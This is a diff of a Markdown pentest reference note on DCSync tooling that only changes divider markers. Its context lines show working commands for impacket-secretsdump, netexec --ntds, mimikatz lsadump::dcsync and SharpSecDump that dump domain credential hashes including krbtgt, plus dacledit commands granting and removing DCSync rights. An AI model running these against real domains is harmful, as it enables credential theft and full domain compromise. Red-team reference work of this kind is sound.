@@ -18,7 +18,7 @@ linked:
 
 # DCSync - Tooling
 
-***
+---
 
 ## impacket-secretsdump
 
@@ -44,7 +44,7 @@ impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-d
 impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-user krbtgt
 ```
 
-___
+---
 
 ## nxc / netexec
 
@@ -62,7 +62,7 @@ nxc smb dc01.corp.local -u administrator -p 'P@ssw0rd' --ntds --enabled
 # Output en ~/.nxc/logs/
 ```
 
-___
+---
 
 ## mimikatz lsadump
 
@@ -80,7 +80,7 @@ mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
 mimikatz # lsadump::dcsync /domain:corp.local /all /csv
 ```
 
-___
+---
 
 ## SharpSecDump (.NET)
 
@@ -94,7 +94,7 @@ ___
 .\SharpSecDump.exe -target=dc01.corp.local -u=administrator -p='P@ssw0rd' -d=corp.local
 ```
 
-___
+---
 
 ## dacledit (grant/remove DCSync)
 
@@ -112,7 +112,7 @@ impacket-secretsdump corp.local/attacker:'P@ssw0rd'@dc01.corp.local -just-dc-ntl
 dacledit.py -action remove -rights DCSync -principal attacker corp.local/administrator:'P@ssw0rd'@dc01.corp.local
 ```
 
-___
+---
 
 ## Recursos
 
@@ -128,4 +128,4 @@ ___
 | MITRE ATT&CK T1003.006 | `https://attack.mitre.org/techniques/T1003/006/` |
 ^dcsync-tool-resources
 
-***
+---
